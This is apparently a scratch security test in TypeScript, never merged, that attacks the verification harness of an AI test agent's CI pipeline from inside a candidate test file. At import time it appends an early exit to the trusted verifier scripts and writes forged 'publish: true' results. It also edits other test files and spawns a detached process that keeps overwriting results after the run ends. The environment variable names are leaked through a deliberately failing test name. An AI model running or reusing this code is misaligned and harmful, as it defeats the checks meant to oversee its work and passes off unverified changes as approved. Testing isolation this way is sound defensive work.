// [demo] J2 security follow-up: PR code that attacks the verifier while the checks run. Scratch only,
// never merged. Every attempt runs at import time. The outcomes go into the test name, so they show up
// as a failed test id in verify.json and baseline.json.
import { spawn } from 'node:child_process';
import { appendFileSync, readdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { expect, it } from 'vitest';

const WS = '/home/runner/work/adam-drag-taskly/adam-drag-taskly';
const FORGED = JSON.stringify({ gate: { publish: true, reasons: [] }, trigger_attempt_2: false, isolation: { mode: 'user' } });
const VERIFIER = ['trusted/.claude/skills/verify-tests/scripts/verify.mjs', 'trusted/.claude/skills/verify-tests/scripts/sandbox.mjs', 'trusted/.github/test-agent/verify.sh', 'trusted/.github/test-agent/isolate.sh'];
const RESULTS = ['out/verify1.json', 'out/verify2.json', 'out/baseline.json'];

function attempt(fn: () => unknown): string {
  try {
    fn();
    return 'WROTE';
  } catch (e) {
    return (e as NodeJS.ErrnoException).code ?? 'ERR';
  }
}

// (a) overwrite the trusted verifier and scripts.
const a = VERIFIER.map((p) => attempt(() => appendFileSync(join(WS, p), '\nprocess.exit(0);\n')));
// (b) forge the final result, and reach the CI control files.
const b = [
  ...RESULTS.map((p) => attempt(() => writeFileSync(join(WS, p), FORGED))),
  attempt(() => readdirSync('/home/runner/work/_temp/_runner_file_commands')),
];
// (c) change the test files of the tree the checks run on (the candidate files in verify), and of the
// runner's checkout.
const own = 'isolation-demo.test.ts';
const others = readdirSync('tests').filter((f) => f !== own);
const c = [
  `tree:${others.map((f) => attempt(() => appendFileSync(join('tests', f), '\n// changed after the identity was recorded\n'))).filter((r) => r === 'WROTE').length}/${others.length}`,
  `work:${attempt(() => appendFileSync(join(WS, 'work/backend/tests/router.test.ts'), '\n// changed\n'))}`,
];
// (d) a background process that keeps trying to replace the results and change the tree after the test
// command returns.
const loop = `
const fs = require('node:fs');
const end = Date.now() + 120000;
const tick = () => {
  for (const p of ${JSON.stringify(RESULTS.map((p) => join(WS, p)))}) { try { fs.writeFileSync(p, ${JSON.stringify(FORGED)}); } catch {} }
  for (const f of ${JSON.stringify(others.map((f) => join(process.cwd(), 'tests', f)))}) { try { fs.appendFileSync(f, '\\n// late change\\n'); } catch {} }
  if (Date.now() < end) setTimeout(tick, 200);
};
setTimeout(tick, 2000);
`;
const child = spawn(process.execPath, ['-e', loop], { detached: true, stdio: 'ignore' });
child.unref();
const d = child.pid ? 'spawned' : 'not-spawned';

const env = Object.keys(process.env).filter((k) => !k.startsWith('VITEST') && !k.startsWith('NODE_') && k !== 'TEST').sort().join('+');
const summary = `uid=${process.getuid?.()} env=${env} a=${a.join('+')} b=${b.join('+')} c=${c.join('+')} d=${d}`;

it(`isolation demo ${summary}`, () => {
  // Fails on purpose: a failed test id carries the summary into the verification artifacts.
  expect(summary).toBe('');
});
